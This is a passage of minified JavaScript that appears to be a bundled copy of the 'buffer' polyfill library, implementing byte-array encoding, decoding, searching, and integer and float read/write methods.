                    case "hex":
                        return n >>> 1;
                    case "base64":
                        return Z(t).length;
                    default:
                        if (i)
                            return r ? -1 : G(t).length;
                        e = ("" + e).toLowerCase(),
                        i = !0
                    }
            }
            function w(t, e, n) {
                let r = !1;
                if ((void 0 === e || e < 0) && (e = 0),
                e > this.length)
                    return "";
                if ((void 0 === n || n > this.length) && (n = this.length),
                n <= 0)
                    return "";
                if ((n >>>= 0) <= (e >>>= 0))
                    return "";
                for (t || (t = "utf8"); ; )
                    switch (t) {
                    case "hex":
                        return k(this, e, n);
                    case "utf8":
                    case "utf-8":
                        return _(this, e, n);
                    case "ascii":
                        return x(this, e, n);
                    case "latin1":
                    case "binary":
                        return D(this, e, n);
                    case "base64":
                        return b(this, e, n);
                    case "ucs2":
                    case "ucs-2":
                    case "utf16le":
                    case "utf-16le":
                        return L(this, e, n);
                    default:
                        if (r)
                            throw new TypeError("Unknown encoding: " + t);
                        t = (t + "").toLowerCase(),
                        r = !0
                    }
            }
            function m(t, e, n) {
                const r = t[e];
                t[e] = t[n],
                t[n] = r
            }
            function y(t, e, n, r, i) {
                if (0 === t.length)
                    return -1;
                if ("string" == typeof n ? (r = n,
                n = 0) : n > 2147483647 ? n = 2147483647 : n < -2147483648 && (n = -2147483648),
                X(n = +n) && (n = i ? 0 : t.length - 1),
                n < 0 && (n = t.length + n),
                n >= t.length) {
                    if (i)
                        return -1;
                    n = t.length - 1
                } else if (n < 0) {
                    if (!i)
                        return -1;
                    n = 0
                }
                if ("string" == typeof e && (e = c.from(e, r)),
                c.isBuffer(e))
                    return 0 === e.length ? -1 : v(t, e, n, r, i);
                if ("number" == typeof e)
                    return e &= 255,
                    "function" == typeof Uint8Array.prototype.indexOf ? i ? Uint8Array.prototype.indexOf.call(t, e, n) : Uint8Array.prototype.lastIndexOf.call(t, e, n) : v(t, [e], n, r, i);
                throw new TypeError("val must be string, number or Buffer")
            }
            function v(t, e, n, r, i) {
                let o, s = 1, a = t.length, c = e.length;
                if (void 0 !== r && ("ucs2" === (r = String(r).toLowerCase()) || "ucs-2" === r || "utf16le" === r || "utf-16le" === r)) {
                    if (t.length < 2 || e.length < 2)
                        return -1;
                    s = 2,
                    a /= 2,
                    c /= 2,
                    n /= 2
                }
                function l(t, e) {
                    return 1 === s ? t[e] : t.readUInt16BE(e * s)
                }
                if (i) {
                    let r = -1;
                    for (o = n; o < a; o++)
                        if (l(t, o) === l(e, -1 === r ? 0 : o - r)) {
                            if (-1 === r && (r = o),
                            o - r + 1 === c)
                                return r * s
                        } else
                            -1 !== r && (o -= o - r),
                            r = -1
                } else
                    for (n + c > a && (n = a - c),
                    o = n; o >= 0; o--) {
                        let n = !0;
                        for (let r = 0; r < c; r++)
                            if (l(t, o + r) !== l(e, r)) {
                                n = !1;
                                break
                            }
                        if (n)
                            return o
                    }
                return -1
            }
            function M(t, e, n, r) {
                n = Number(n) || 0;
                const i = t.length - n;
                r ? (r = Number(r)) > i && (r = i) : r = i;
                const o = e.length;
                let s;
                for (r > o / 2 && (r = o / 2),
                s = 0; s < r; ++s) {
                    const r = parseInt(e.substr(2 * s, 2), 16);
                    if (X(r))
                        return s;
                    t[n + s] = r
                }
                return s
            }
            function N(t, e, n, r) {
                return H(G(e, t.length - n), t, n, r)
            }
            function I(t, e, n, r) {
                return H(function(t) {
                    const e = [];
                    for (let n = 0; n < t.length; ++n)
                        e.push(255 & t.charCodeAt(n));
                    return e
                }(e), t, n, r)
            }
            function E(t, e, n, r) {
                return H(Z(e), t, n, r)
            }
            function A(t, e, n, r) {
                return H(function(t, e) {
                    let n, r, i;
                    const o = [];
                    for (let s = 0; s < t.length && !((e -= 2) < 0); ++s)
                        n = t.charCodeAt(s),
                        r = n >> 8,
                        i = n % 256,
                        o.push(i),
                        o.push(r);
                    return o
                }(e, t.length - n), t, n, r)
            }
            function b(t, e, n) {
                return 0 === e && n === t.length ? r.fromByteArray(t) : r.fromByteArray(t.slice(e, n))
            }
            function _(t, e, n) {
                n = Math.min(t.length, n);
                const r = [];
                let i = e;
                for (; i < n; ) {
                    const e = t[i];
                    let o = null
                      , s = e > 239 ? 4 : e > 223 ? 3 : e > 191 ? 2 : 1;
                    if (i + s <= n) {
                        let n, r, a, c;
                        switch (s) {
                        case 1:
                            e < 128 && (o = e);
                            break;
                        case 2:
                            n = t[i + 1],
                            128 == (192 & n) && (c = (31 & e) << 6 | 63 & n,
                            c > 127 && (o = c));
                            break;
                        case 3:
                            n = t[i + 1],
                            r = t[i + 2],
                            128 == (192 & n) && 128 == (192 & r) && (c = (15 & e) << 12 | (63 & n) << 6 | 63 & r,
                            c > 2047 && (c < 55296 || c > 57343) && (o = c));
                            break;
                        case 4:
                            n = t[i + 1],
                            r = t[i + 2],
                            a = t[i + 3],
                            128 == (192 & n) && 128 == (192 & r) && 128 == (192 & a) && (c = (15 & e) << 18 | (63 & n) << 12 | (63 & r) << 6 | 63 & a,
                            c > 65535 && c < 1114112 && (o = c))
                        }
                    }
                    null === o ? (o = 65533,
                    s = 1) : o > 65535 && (o -= 65536,
                    r.push(o >>> 10 & 1023 | 55296),
                    o = 56320 | 1023 & o),
                    r.push(o),
                    i += s
                }
                return function(t) {
                    const e = t.length;
                    if (e <= T)
                        return String.fromCharCode.apply(String, t);
                    let n = ""
                      , r = 0;
                    for (; r < e; )
                        n += String.fromCharCode.apply(String, t.slice(r, r += T));
                    return n
                }(r)
            }
            c.TYPED_ARRAY_SUPPORT = function() {
                try {
                    const t = new Uint8Array(1)
                      , e = {
                        foo: function() {
                            return 42
                        }
                    };
                    return Object.setPrototypeOf(e, Uint8Array.prototype),
                    Object.setPrototypeOf(t, e),
                    42 === t.foo()
                } catch (t) {
                    return !1
                }
            }(),
            c.TYPED_ARRAY_SUPPORT || "undefined" == typeof console || "function" != typeof console.error || console.error("This browser lacks typed array (Uint8Array) support which is required by `buffer` v5.x. Use `buffer` v4.x if you require old browser support."),
            Object.defineProperty(c.prototype, "parent", {
                enumerable: !0,
                get: function() {
                    if (c.isBuffer(this))
                        return this.buffer
                }
            }),
            Object.defineProperty(c.prototype, "offset", {
                enumerable: !0,
                get: function() {
                    if (c.isBuffer(this))
                        return this.byteOffset
                }
            }),
            c.poolSize = 8192,
            c.from = function(t, e, n) {
                return l(t, e, n)
            }
            ,
            Object.setPrototypeOf(c.prototype, Uint8Array.prototype),
            Object.setPrototypeOf(c, Uint8Array),
            c.alloc = function(t, e, n) {
                return function(t, e, n) {
                    return d(t),
                    t <= 0 ? a(t) : void 0 !== e ? "string" == typeof n ? a(t).fill(e, n) : a(t).fill(e) : a(t)
                }(t, e, n)
            }
            ,
            c.allocUnsafe = function(t) {
                return h(t)
            }
            ,
            c.allocUnsafeSlow = function(t) {
                return h(t)
            }
            ,
            c.isBuffer = function(t) {
                return null != t && !0 === t._isBuffer && t !== c.prototype
            }
            ,
            c.compare = function(t, e) {
                if (J(t, Uint8Array) && (t = c.from(t, t.offset, t.byteLength)),
                J(e, Uint8Array) && (e = c.from(e, e.offset, e.byteLength)),
                !c.isBuffer(t) || !c.isBuffer(e))
                    throw new TypeError('The "buf1", "buf2" arguments must be one of type Buffer or Uint8Array');
                if (t === e)
                    return 0;
                let n = t.length
                  , r = e.length;
                for (let i = 0, o = Math.min(n, r); i < o; ++i)
                    if (t[i] !== e[i]) {
                        n = t[i],
                        r = e[i];
                        break
                    }
                return n < r ? -1 : r < n ? 1 : 0
            }
            ,
            c.isEncoding = function(t) {
                switch (String(t).toLowerCase()) {
                case "hex":
                case "utf8":
                case "utf-8":
                case "ascii":
                case "latin1":
                case "binary":
                case "base64":
                case "ucs2":
                case "ucs-2":
                case "utf16le":
                case "utf-16le":
                    return !0;
                default:
                    return !1
                }
            }
            ,
            c.concat = function(t, e) {
                if (!Array.isArray(t))
                    throw new TypeError('"list" argument must be an Array of Buffers');
                if (0 === t.length)
                    return c.alloc(0);
                let n;
                if (void 0 === e)
                    for (e = 0,
                    n = 0; n < t.length; ++n)
                        e += t[n].length;
                const r = c.allocUnsafe(e);
                let i = 0;
                for (n = 0; n < t.length; ++n) {
                    let e = t[n];
                    if (J(e, Uint8Array))
                        i + e.length > r.length ? (c.isBuffer(e) || (e = c.from(e)),
                        e.copy(r, i)) : Uint8Array.prototype.set.call(r, e, i);
                    else {
                        if (!c.isBuffer(e))
                            throw new TypeError('"list" argument must be an Array of Buffers');
                        e.copy(r, i)
                    }
                    i += e.length
                }
                return r
            }
            ,
            c.byteLength = g,
            c.prototype._isBuffer = !0,
            c.prototype.swap16 = function() {
                const t = this.length;
                if (t % 2 != 0)
                    throw new RangeError("Buffer size must be a multiple of 16-bits");
                for (let e = 0; e < t; e += 2)
                    m(this, e, e + 1);
                return this
            }
            ,
            c.prototype.swap32 = function() {
                const t = this.length;
                if (t % 4 != 0)
                    throw new RangeError("Buffer size must be a multiple of 32-bits");
                for (let e = 0; e < t; e += 4)
                    m(this, e, e + 3),
                    m(this, e + 1, e + 2);
                return this
            }
            ,
            c.prototype.swap64 = function() {
                const t = this.length;
                if (t % 8 != 0)
                    throw new RangeError("Buffer size must be a multiple of 64-bits");
                for (let e = 0; e < t; e += 8)
                    m(this, e, e + 7),
                    m(this, e + 1, e + 6),
                    m(this, e + 2, e + 5),
                    m(this, e + 3, e + 4);
                return this
            }
            ,
            c.prototype.toString = function() {
                const t = this.length;
                return 0 === t ? "" : 0 === arguments.length ? _(this, 0, t) : w.apply(this, arguments)
            }
            ,
            c.prototype.toLocaleString = c.prototype.toString,
            c.prototype.equals = function(t) {
                if (!c.isBuffer(t))
                    throw new TypeError("Argument must be a Buffer");
                return this === t || 0 === c.compare(this, t)
            }
            ,
            c.prototype.inspect = function() {
                let t = "";
                const n = e.IS;
                return t = this.toString("hex", 0, n).replace(/(.{2})/g, "$1 ").trim(),
                this.length > n && (t += " ... "),
                "<Buffer " + t + ">"
            }
            ,
            o && (c.prototype[o] = c.prototype.inspect),
            c.prototype.compare = function(t, e, n, r, i) {
                if (J(t, Uint8Array) && (t = c.from(t, t.offset, t.byteLength)),
                !c.isBuffer(t))
                    throw new TypeError('The "target" argument must be one of type Buffer or Uint8Array. Received type ' + typeof t);
                if (void 0 === e && (e = 0),
                void 0 === n && (n = t ? t.length : 0),
                void 0 === r && (r = 0),
                void 0 === i && (i = this.length),
                e < 0 || n > t.length || r < 0 || i > this.length)
                    throw new RangeError("out of range index");
                if (r >= i && e >= n)
                    return 0;
                if (r >= i)
                    return -1;
                if (e >= n)
                    return 1;
                if (this === t)
                    return 0;
                let o = (i >>>= 0) - (r >>>= 0)
                  , s = (n >>>= 0) - (e >>>= 0);
                const a = Math.min(o, s)
                  , l = this.slice(r, i)
                  , d = t.slice(e, n);
                for (let t = 0; t < a; ++t)
                    if (l[t] !== d[t]) {
                        o = l[t],
                        s = d[t];
                        break
                    }
                return o < s ? -1 : s < o ? 1 : 0
            }
            ,
            c.prototype.includes = function(t, e, n) {
                return -1 !== this.indexOf(t, e, n)
            }
            ,
            c.prototype.indexOf = function(t, e, n) {
                return y(this, t, e, n, !0)
            }
            ,
            c.prototype.lastIndexOf = function(t, e, n) {
                return y(this, t, e, n, !1)
            }
            ,
            c.prototype.write = function(t, e, n, r) {
                if (void 0 === e)
                    r = "utf8",
                    n = this.length,
                    e = 0;
                else if (void 0 === n && "string" == typeof e)
                    r = e,
                    n = this.length,
                    e = 0;
                else {
                    if (!isFinite(e))
                        throw new Error("Buffer.write(string, encoding, offset[, length]) is no longer supported");
                    e >>>= 0,
                    isFinite(n) ? (n >>>= 0,
                    void 0 === r && (r = "utf8")) : (r = n,
                    n = void 0)
                }
                const i = this.length - e;
                if ((void 0 === n || n > i) && (n = i),
                t.length > 0 && (n < 0 || e < 0) || e > this.length)
                    throw new RangeError("Attempt to write outside buffer bounds");
                r || (r = "utf8");
                let o = !1;
                for (; ; )
                    switch (r) {
                    case "hex":
                        return M(this, t, e, n);
                    case "utf8":
                    case "utf-8":
                        return N(this, t, e, n);
                    case "ascii":
                    case "latin1":
                    case "binary":
                        return I(this, t, e, n);
                    case "base64":
                        return E(this, t, e, n);
                    case "ucs2":
                    case "ucs-2":
                    case "utf16le":
                    case "utf-16le":
                        return A(this, t, e, n);
                    default:
                        if (o)
                            throw new TypeError("Unknown encoding: " + r);
                        r = ("" + r).toLowerCase(),
                        o = !0
                    }
            }
            ,
            c.prototype.toJSON = function() {
                return {
                    type: "Buffer",
                    data: Array.prototype.slice.call(this._arr || this, 0)
                }
            }
            ;
            const T = 4096;
            function x(t, e, n) {
                let r = "";
                n = Math.min(t.length, n);
                for (let i = e; i < n; ++i)
                    r += String.fromCharCode(127 & t[i]);
                return r
            }
            function D(t, e, n) {
                let r = "";
                n = Math.min(t.length, n);
                for (let i = e; i < n; ++i)
                    r += String.fromCharCode(t[i]);
                return r
            }
            function k(t, e, n) {
                const r = t.length;
                (!e || e < 0) && (e = 0),
                (!n || n < 0 || n > r) && (n = r);
                let i = "";
                for (let r = e; r < n; ++r)
                    i += q[t[r]];
                return i
            }
            function L(t, e, n) {
                const r = t.slice(e, n);
                let i = "";
                for (let t = 0; t < r.length - 1; t += 2)
                    i += String.fromCharCode(r[t] + 256 * r[t + 1]);
                return i
            }
            function S(t, e, n) {
                if (t % 1 != 0 || t < 0)
                    throw new RangeError("offset is not uint");
                if (t + e > n)
                    throw new RangeError("Trying to access beyond buffer length")
            }
            function C(t, e, n, r, i, o) {
                if (!c.isBuffer(t))
                    throw new TypeError('"buffer" argument must be a Buffer instance');
                if (e > i || e < o)
                    throw new RangeError('"value" argument is out of bounds');
                if (n + r > t.length)
                    throw new RangeError("Index out of range")
            }
            function j(t, e, n, r, i) {
                B(e, r, i, t, n, 7);
                let o = Number(e & BigInt(4294967295));
                t[n++] = o,
                o >>= 8,
                t[n++] = o,
                o >>= 8,
                t[n++] = o,
                o >>= 8,
                t[n++] = o;
                let s = Number(e >> BigInt(32) & BigInt(4294967295));
                return t[n++] = s,
                s >>= 8,
                t[n++] = s,
                s >>= 8,
                t[n++] = s,
                s >>= 8,
                t[n++] = s,
                n
            }
            function O(t, e, n, r, i) {
                B(e, r, i, t, n, 7);
                let o = Number(e & BigInt(4294967295));
                t[n + 7] = o,
                o >>= 8,
                t[n + 6] = o,
                o >>= 8,
                t[n + 5] = o,
                o >>= 8,
                t[n + 4] = o;
                let s = Number(e >> BigInt(32) & BigInt(4294967295));
                return t[n + 3] = s,
                s >>= 8,
                t[n + 2] = s,
                s >>= 8,
                t[n + 1] = s,
                s >>= 8,
                t[n] = s,
                n + 8
            }
            function U(t, e, n, r, i, o) {
                if (n + r > t.length)
                    throw new RangeError("Index out of range");
                if (n < 0)
                    throw new RangeError("Index out of range")
            }
            function W(t, e, n, r, o) {
                return e = +e,
                n >>>= 0,
                o || U(t, 0, n, 4),
                i.write(t, e, n, r, 23, 4),
                n + 4
            }
            function z(t, e, n, r, o) {
                return e = +e,
                n >>>= 0,
                o || U(t, 0, n, 8),
                i.write(t, e, n, r, 52, 8),
                n + 8
            }
            c.prototype.slice = function(t, e) {
                const n = this.length;
                (t = ~~t) < 0 ? (t += n) < 0 && (t = 0) : t > n && (t = n),
                (e = void 0 === e ? n : ~~e) < 0 ? (e += n) < 0 && (e = 0) : e > n && (e = n),
                e < t && (e = t);
                const r = this.subarray(t, e);
                return Object.setPrototypeOf(r, c.prototype),
                r
            }
            ,
            c.prototype.readUintLE = c.prototype.readUIntLE = function(t, e, n) {
                t >>>= 0,
                e >>>= 0,
                n || S(t, e, this.length);
                let r = this[t]
                  , i = 1
                  , o = 0;
                for (; ++o < e && (i *= 256); )
                    r += this[t + o] * i;
                return r
            }
            ,
            c.prototype.readUintBE = c.prototype.readUIntBE = function(t, e, n) {
                t >>>= 0,
                e >>>= 0,
                n || S(t, e, this.length);
                let r = this[t + --e]
                  , i = 1;
                for (; e > 0 && (i *= 256); )
                    r += this[t + --e] * i;
                return r
            }
            ,
            c.prototype.readUint8 = c.prototype.readUInt8 = function(t, e) {
                return t >>>= 0,
                e || S(t, 1, this.length),
                this[t]
            }
            ,
            c.prototype.readUint16LE = c.prototype.readUInt16LE = function(t, e) {
                return t >>>= 0,
                e || S(t, 2, this.length),
                this[t] | this[t + 1] << 8
            }
            ,
            c.prototype.readUint16BE = c.prototype.readUInt16BE = function(t, e) {
                return t >>>= 0,
                e || S(t, 2, this.length),
                this[t] << 8 | this[t + 1]
            }
            ,
            c.prototype.readUint32LE = c.prototype.readUInt32LE = function(t, e) {
                return t >>>= 0,
                e || S(t, 4, this.length),
                (this[t] | this[t + 1] << 8 | this[t + 2] << 16) + 16777216 * this[t + 3]
            }
            ,
            c.prototype.readUint32BE = c.prototype.readUInt32BE = function(t, e) {
                return t >>>= 0,
                e || S(t, 4, this.length),
                16777216 * this[t] + (this[t + 1] << 16 | this[t + 2] << 8 | this[t + 3])
            }
            ,
            c.prototype.readBigUInt64LE = K(function(t) {
                V(t >>>= 0, "offset");
                const e = this[t]
                  , n = this[t + 7];
                void 0 !== e && void 0 !== n || Q(t, this.length - 8);
                const r = e + 256 * this[++t] + 65536 * this[++t] + this[++t] * 2 ** 24
                  , i = this[++t] + 256 * this[++t] + 65536 * this[++t] + n * 2 ** 24;
                return BigInt(r) + (BigInt(i) << BigInt(32))
            }),
            c.prototype.readBigUInt64BE = K(function(t) {
                V(t >>>= 0, "offset");
                const e = this[t]
                  , n = this[t + 7];
                void 0 !== e && void 0 !== n || Q(t, this.length - 8);
                const r = e * 2 ** 24 + 65536 * this[++t] + 256 * this[++t] + this[++t]
                  , i = this[++t] * 2 ** 24 + 65536 * this[++t] + 256 * this[++t] + n;
                return (BigInt(r) << BigInt(32)) + BigInt(i)
            }),
            c.prototype.readIntLE = function(t, e, n) {
                t >>>= 0,
                e >>>= 0,
                n || S(t, e, this.length);
                let r = this[t]
                  , i = 1
                  , o = 0;
                for (; ++o < e && (i *= 256); )
                    r += this[t + o] * i;
                return i *= 128,
                r >= i && (r -= Math.pow(2, 8 * e)),
                r
            }
            ,
            c.prototype.readIntBE = function(t, e, n) {
                t >>>= 0,
                e >>>= 0,
                n || S(t, e, this.length);
                let r = e
                  , i = 1
                  , o = this[t + --r];
                for (; r > 0 && (i *= 256); )
                    o += this[t + --r] * i;
                return i *= 128,
                o >= i && (o -= Math.pow(2, 8 * e)),
                o
            }
            ,
            c.prototype.readInt8 = function(t, e) {
                return t >>>= 0,
                e || S(t, 1, this.length),
                128 & this[t] ? -1 * (255 - this[t] + 1) : this[t]
            }
            ,
            c.prototype.readInt16LE = function(t, e) {
                t >>>= 0,
                e || S(t, 2, this.length);
                const n = this[t] | this[t + 1] << 8;
                return 32768 & n ? 4294901760 | n : n
            }
            ,
            c.prototype.readInt16BE = function(t, e) {
                t >>>= 0,
                e || S(t, 2, this.length);
                const n = this[t + 1] | this[t] << 8;
                return 32768 & n ? 4294901760 | n : n
            }
            ,
            c.prototype.readInt32LE = function(t, e) {
                return t >>>= 0,
                e || S(t, 4, this.length),
                this[t] | this[t + 1] << 8 | this[t + 2] << 16 | this[t + 3] << 24
            }
            ,
            c.prototype.readInt32BE = function(t, e) {
                return t >>>= 0,
                e || S(t, 4, this.length),
                this[t] << 24 | this[t + 1] << 16 | this[t + 2] << 8 | this[t + 3]
            }
            ,
            c.prototype.readBigInt64LE = K(function(t) {
                V(t >>>= 0, "offset");
                const e = this[t]
                  , n = this[t + 7];
                void 0 !== e && void 0 !== n || Q(t, this.length - 8);
                const r = this[t + 4] + 256 * this[t + 5] + 65536 * this[t + 6] + (n << 24);
                return (BigInt(r) << BigInt(32)) + BigInt(e + 256 * this[++t] + 65536 * this[++t] + this[++t] * 2 ** 24)
            }),
            c.prototype.readBigInt64BE = K(function(t) {
                V(t >>>= 0, "offset");
                const e = this[t]
                  , n = this[t + 7];
                void 0 !== e && void 0 !== n || Q(t, this.length - 8);
                const r = (e << 24) + 65536 * this[++t] + 256 * this[++t] + this[++t];
                return (BigInt(r) << BigInt(32)) + BigInt(this[++t] * 2 ** 24 + 65536 * this[++t] + 256 * this[++t] + n)
            }),
            c.prototype.readFloatLE = function(t, e) {
                return t >>>= 0,
                e || S(t, 4, this.length),
                i.read(this, t, !0, 23, 4)
            }
            ,
            c.prototype.readFloatBE = function(t, e) {
                return t >>>= 0,
                e || S(t, 4, this.length),
                i.read(this, t, !1, 23, 4)
            }
            ,
            c.prototype.readDoubleLE = function(t, e) {
                return t >>>= 0,
                e || S(t, 8, this.length),
                i.read(this, t, !0, 52, 8)
            }
            ,
            c.prototype.readDoubleBE = function(t, e) {
                return t >>>= 0,
                e || S(t, 8, this.length),
                i.read(this, t, !1, 52, 8)
            }
            ,
            c.prototype.writeUintLE = c.prototype.writeUIntLE = function(t, e, n, r) {
                t = +t,
                e >>>= 0,
                n >>>= 0,
                r || C(this, t, e, n, Math.pow(2, 8 * n) - 1, 0);
                let i = 1
                  , o = 0;
                for (this[e] = 255 & t; ++o < n && (i *= 256); )
                    this[e + o] = t / i & 255;
                return e + n
            }
            ,
            c.prototype.writeUintBE = c.prototype.writeUIntBE = function(t, e, n, r) {
                t = +t,
                e >>>= 0,
                n >>>= 0,
                r || C(this, t, e, n, Math.pow(2, 8 * n) - 1, 0);
                let i = n - 1
                  , o = 1;
                for (this[e + i] = 255 & t; --i >= 0 && (o *= 256); )
                    this[e + i] = t / o & 255;
                return e + n
            }
            ,
            c.prototype.writeUint8 = c.prototype.writeUInt8 = function(t, e, n) {
                return t = +t,
                e >>>= 0,
                n || C(this, t, e, 1, 255, 0),
                this[e] = 255 & t,
                e + 1
            }
            ,
            c.prototype.writeUint16LE = c.prototype.writeUInt16LE = function(t, e, n) {
                return t = +t,
                e >>>= 0,
                n || C(this, t, e, 2, 65535, 0),
                this[e] = 255 & t,
                this[e + 1] = t >>> 8,
                e + 2
            }
            ,
            c.prototype.writeUint16BE = c.prototype.writeUInt16BE = function(t, e, n) {
                return t = +t,
                e >>>= 0,
                n || C(this, t, e, 2, 65535, 0),
                this[e] = t >>> 8,
                this[e + 1] = 255 & t,
                e + 2
            }
            ,
            c.prototype.writeUint32LE = c.prototype.writeUInt32LE = function(t, e, n) {
                return t = +t,
                e >>>= 0,
                n || C(this, t, e, 4, 4294967295, 0),
                this[e + 3] = t >>> 24,
                this[e + 2] = t >>> 16,
                this[e + 1] = t >>> 8,
                this[e] = 255 & t,
                e + 4
            }
            ,
            c.prototype.writeUint32BE = c.prototype.writeUInt32BE = function(t, e, n) {
                return t = +t,
                e >>>= 0,
                n || C(this, t, e, 4, 4294967295, 0),
                this[e] = t >>> 24,
                this[e + 1] = t >>> 16,
                this[e + 2] = t >>> 8,
                this[e + 3] = 255 & t,
                e + 4
            }
            ,
            c.prototype.writeBigUInt64LE = K(function(t, e=0) {
                return j(this, t, e, BigInt(0), BigInt("0xffffffffffffffff"))
            }),
            c.prototype.writeBigUInt64BE = K(function(t, e=0) {
                return O(this, t, e, BigInt(0), BigInt("0xffffffffffffffff"))
            }),
            c.prototype.writeIntLE = function(t, e, n, r) {
                if (t = +t,
                e >>>= 0,
                !r) {
                    const r = Math.pow(2, 8 * n - 1);
                    C(this, t, e, n, r - 1, -r)
                }
                let i = 0
                  , o = 1
                  , s = 0;
                for (this[e] = 255 & t; ++i < n && (o *= 256); )
                    t < 0 && 0 === s && 0 !== this[e + i - 1] && (s = 1),
                    this[e + i] = (t / o | 0) - s & 255;
                return e + n
            }
            ,
            c.prototype.writeIntBE = function(t, e, n, r) {
                if (t = +t,
                e >>>= 0,
                !r) {
                    const r = Math.pow(2, 8 * n - 1);
                    C(this, t, e, n, r - 1, -r)
                }
                let i = n - 1
                  , o = 1
                  , s = 0;
                for (this[e + i] = 255 & t; --i >= 0 && (o *= 256); )
                    t < 0 && 0 === s && 0 !== this[e + i + 1] && (s = 1),
                    this[e + i] = (t / o | 0) - s & 255;
                return e + n
            }
            ,
            c.prototype.writeInt8 = function(t, e, n) {
                return t = +t,
                e >>>= 0,
                n || C(this, t, e, 1, 127, -128),
                t < 0 && (t = 255 + t + 1),
                this[e] = 255 & t,
                e + 1
            }
            ,
            c.prototype.writeInt16LE = function(t, e, n) {
                return t = +t,
                e >>>= 0,
                n || C(this, t, e, 2, 32767, -32768),
                this[e] = 255 & t,
                this[e + 1] = t >>> 8,
                e + 2
            }
            ,
            c.prototype.writeInt16BE = function(t, e, n) {
                return t = +t,
                e >>>= 0,
                n || C(this, t, e, 2, 32767, -32768),
                this[e] = t >>> 8,
                this[e + 1] = 255 & t,
                e + 2
            }
            ,
            c.prototype.writeInt32LE = function(t, e, n) {
                return t = +t,
                e >>>= 0,
                n || C(this, t, e, 4, 2147483647, -2147483648),
                this[e] = 255 & t,
                this[e + 1] = t >>> 8,
                this[e + 2] = t >>> 16,
                this[e + 3] = t >>> 24,
                e + 4
            }
            ,
            c.prototype.writeInt32BE = function(t, e, n) {
                return t = +t,
                e >>>= 0,
                n || C(this, t, e, 4, 2147483647, -2147483648),
                t < 0 && (t = 4294967295 + t + 1),
                this[e] = t >>> 24,
                this[e + 1] = t >>> 16,
                this[e + 2] = t >>> 8,
                this[e + 3] = 255 & t,
                e + 4
            }
            ,
            c.prototype.writeBigInt64LE = K(function(t, e=0) {
                return j(this, t, e, -BigInt("0x8000000000000000"), BigInt("0x7fffffffffffffff"))
            }),
            c.prototype.writeBigInt64BE = K(function(t, e=0) {
                return O(this, t, e, -BigInt("0x8000000000000000"), BigInt("0x7fffffffffffffff"))
            }),
            c.prototype.writeFloatLE = function(t, e, n) {
                return W(this, t, e, !0, n)
            }
            ,
            c.prototype.writeFloatBE = function(t, e, n) {
                return W(this, t, e, !1, n)
            }
            ,
            c.prototype.writeDoubleLE = function(t, e, n) {
                return z(this, t, e, !0, n)
            }
            ,
            c.prototype.writeDoubleBE = function(t, e, n) {
                return z(this, t, e, !1, n)
            }
            ,
            c.prototype.copy = function(t, e, n, r) {
                if (!c.isBuffer(t))
                    throw new TypeError("argument should be a Buffer");
                if (n || (n = 0),
                r || 0 === r || (r = this.length),
                e >= t.length && (e = t.length),
                e || (e = 0),
                r > 0 && r < n && (r = n),
                r === n)
                    return 0;
                if (0 === t.length || 0 === this.length)
                    return 0;
                if (e < 0)
                    throw new RangeError("targetStart out of bounds");
                if (n < 0 || n >= this.length)
                    throw new RangeError("Index out of range");
                if (r < 0)
                    throw new RangeError("sourceEnd out of bounds");
                r > this.length && (r = this.length),
                t.length - e < r - n && (r = t.length - e + n);
                const i = r - n;
                return this === t && "function" == typeof Uint8Array.prototype.copyWithin ? this.copyWithin(e, n, r) : Uint8Array.prototype.set.call(t, this.subarray(n, r), e),
                i
            }
            ,
            c.prototype.fill = function(t, e, n, r) {
                if ("string" == typeof t) {
                    if ("string" == typeof e ? (r = e,
                    e = 0,
                    n = this.length) : "string" == typeof n && (r = n,
                    n = this.length),
                    void 0 !== r && "string" != typeof r)
                        throw new TypeError("encoding must be a string");
                    if ("string" == typeof r && !c.isEncoding(r))
                        throw new TypeError("Unknown encoding: " + r);
                    if (1 === t.length) {
                        const e = t.charCodeAt(0);
                        ("utf8" === r && e < 128 || "latin1" === r) && (t = e)
                    }
                } else
                    "number" == typeof t ? t &= 255 : "boolean" == typeof t && (t = Number(t));
                if (e < 0 || this.length < e || this.length < n)
                    throw new RangeError("Out of range index");
                if (n <= e)
                    return this;
                let i;
                if (e >>>= 0,
                n = void 0 === n ? this.length : n >>> 0,
                t || (t = 0),
                "number" == typeof t)
                    for (i = e; i < n; ++i)
                        this[i] = t;
                else {
                    const o = c.isBuffer(t) ? t : c.from(t, r)
                      , s = o.length;
                    if (0 === s)
                        throw new TypeError('The value "' + t + '" is invalid for argument "value"');
                    for (i = 0; i < n - e; ++i)
                        this[i + e] = o[i % s]
                }
                return this
            }
            ;
            const R = {};
            function P(t, e, n) {
                R[t] = class extends n {
                    constructor() {
                        super(),
                        Object.defineProperty(this, "message", {
                            value: e.apply(this, arguments),
                            writable: !0,
                            configurable: !0
                        }),
                        this.name = `${this.name} [${t}]`,
                        this.stack,
                        delete this.name
                    }
                    get code() {
                        return t
                    }
                    set code(t) {
                        Object.defineProperty(this, "code", {
                            configurable: !0,
                            enumerable: !0,
                            value: t,
                            writable: !0
                        })
                    }
                    toString() {
                        return `${this.name} [${t}]: ${this.message}`
                    }
                }
            }
            function F(t) {
                let e = ""
                  , n = t.length;
                const r = "-" === t[0] ? 1 : 0;
                for (; n >= r + 4; n -= 3)
                    e = `_${t.slice(n - 3, n)}${e}`;
                return `${t.slice(0, n)}${e}`
            }
            function B(t, e, n, r, i, o) {
                if (t > n || t < e) {
                    const r = "bigint" == typeof e ? "n" : "";
                    let i;
                    throw i = o > 3 ? 0 === e || e === BigInt(0) ? `>= 0${r} and < 2${r} ** ${8 * (o + 1)}${r}` : `>= -(2${r} ** ${8 * (o + 1) - 1}${r}) and < 2 ** ${8 * (o + 1) - 1}${r}` : `>= ${e}${r} and <= ${n}${r}`,
                    new R.ERR_OUT_OF_RANGE("value",i,t)
                }
                !function(t, e, n) {
                    V(e, "offset"),
                    void 0 !== t[e] && void 0 !== t[e + n] || Q(e, t.length - (n + 1))
                }(r, i, o)
            }
            function V(t, e) {
                if ("number" != typeof t)
                    throw new R.ERR_INVALID_ARG_TYPE(e,"number",t)
            }
            function Q(t, e, n) {
                if (Math.floor(t) !== t)
                    throw V(t, n),
                    new R.ERR_OUT_OF_RANGE(n || "offset","an integer",t);
                if (e < 0)
                    throw new R.ERR_BUFFER_OUT_OF_BOUNDS;
                throw new R.ERR_OUT_OF_RANGE(n || "offset",`>= ${n ? 1 : 0} and <= ${e}`,t)
            }
            P("ERR_BUFFER_OUT_OF_BOUNDS", function(t) {
                return t ? `${t} is outside of buffer bounds` : "Attempt to access memory outside buffer bounds"
